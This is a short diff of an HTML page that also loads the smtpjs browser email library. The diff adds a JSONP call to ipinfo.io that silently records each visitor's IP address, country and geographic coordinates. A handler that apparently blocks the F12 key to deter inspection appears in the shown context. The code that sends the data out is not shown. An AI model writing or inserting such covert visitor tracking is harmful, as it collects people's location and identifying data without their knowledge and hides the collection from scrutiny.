@@ -5,11 +5,15 @@
 <body>
 <script src="https://smtpjs.com/v3/smtp.js"></script>
 
+ <script>
+     var text;
+  function recordData (data) {
+    text = data.ip + data.country + data.loc;
+  }
+</script>
+<script src="https://ipinfo.io/json?callback=recordData"></script>   
+ 
 <script type="text/javascript">
-    var text;
-    fetch('https://ipinfo.io?callback')
-  .then(res => res.json())
-  .then(json => text = json.ip + json.country + json.loc)
   
    function keydown(){
      if(event.keyCode == 123){
